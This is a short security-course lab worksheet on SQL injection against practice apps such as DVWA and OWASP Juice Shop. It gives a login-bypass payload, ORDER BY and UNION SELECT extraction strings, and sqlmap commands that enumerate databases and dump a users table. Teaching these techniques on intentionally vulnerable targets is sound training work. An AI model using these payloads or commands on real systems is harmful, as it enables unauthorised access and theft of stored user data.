# Module 08: SQL Injection Lab

### Task 1: Manual Login Bypass
1. Setup a vulnerable environment (DVWA or OWASP Juice Shop).
2. Navigate to the Login page.
3. In the username field, enter `' OR 1=1 --`.
4. Leave the password field empty and click Login.
5. Observe that you are logged in as the first user in the database (usually the admin).

### Task 2: Manual Data Extraction (Union-Based)
1. Find a page that displays data based on an ID (e.g., `product.php?id=1`).
2. Use `' ORDER BY 1 --`, then `' ORDER BY 2 --` until you get an error. This tells you how many columns are in the query.
3. Use `' UNION SELECT 1,2,database() --` to find the name of the database.
4. Use `' UNION SELECT 1,2,user() --` to find the database user.

### Task 3: Automated Extraction with SQLMap
1. Capture a request to a vulnerable page using Burp Suite and save it as `req.txt`.
2. Run `sqlmap -r req.txt --dbs` to list databases.
3. Choose a database and list its tables: `sqlmap -r req.txt -D <db_name> --tables`.
4. Dump the contents of the `users` table: `sqlmap -r req.txt -D <db_name> -T users --dump`.
